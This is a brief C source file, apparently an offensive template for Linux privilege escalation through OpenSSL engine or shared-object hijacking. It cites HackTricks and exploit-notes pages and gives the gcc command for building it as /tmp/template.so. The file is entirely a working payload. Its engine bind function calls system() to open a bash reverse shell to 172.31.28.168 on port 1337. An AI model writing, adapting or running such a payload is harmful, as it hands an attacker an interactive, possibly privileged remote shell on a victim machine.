// https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=share%20object#shared-object-hijacking
// https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/openssl-privilege-escalation/
//gcc template.c -fPIC -shared -o /tmp/template.so
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    system("bash -c 'bash -i >& /dev/tcp/172.31.28.168/1337 0>&1'");
    return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()